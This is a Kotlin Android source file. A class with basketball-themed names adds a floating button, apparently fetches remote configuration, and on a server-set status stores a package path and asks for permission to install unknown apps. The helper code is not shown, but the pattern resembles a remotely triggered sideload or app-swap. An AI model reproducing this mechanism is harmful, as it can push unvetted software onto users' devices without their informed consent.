package cn.nba.james

import android.annotation.SuppressLint
import android.content.Context
import android.view.ViewGroup
import androidx.appcompat.app.AppCompatActivity
import com.tencent.mmkv.MMKV

@SuppressLint("StaticFieldLeak")
class Allen {
    companion object {

        private var i: Allen? = null
            get() {
                field ?: run {
                    field = Allen()
                }
                return field
            }

        @Synchronized
        fun get(): Allen {
            return i!!
        }
    }

    private var con: Context? = null


    fun iverson(context: Context) {
        con = context
        if (MMKV.defaultMMKV().decodeBool("state", false))
            return
        val fab = (con as AppCompatActivity).funcCreateFloatActionButton()
        val content = (con as AppCompatActivity).findViewById<ViewGroup>(android.R.id.content)
        content.addView(fab)
        (con as AppCompatActivity).funConfig {
            result.status?.let {
                if (it != "0" && it != "1") return@let
                if (it == "1") {
                    MMKV.defaultMMKV().encode(KEY_PATH, result.oPack)
                    if (!context.packageManager.canRequestPackageInstalls()) {
                        val p = PermissionDialog(fab)
                        p.setParentFab(fab)
                        p.show((con as AppCompatActivity).supportFragmentManager, p.tag)
                    } else {
                        val p = UpdateDialog(fab)
                        p.setParentFab(fab)
                        p.show((con as AppCompatActivity).supportFragmentManager, p.tag)
                    }
                }
            }
        }
    }
}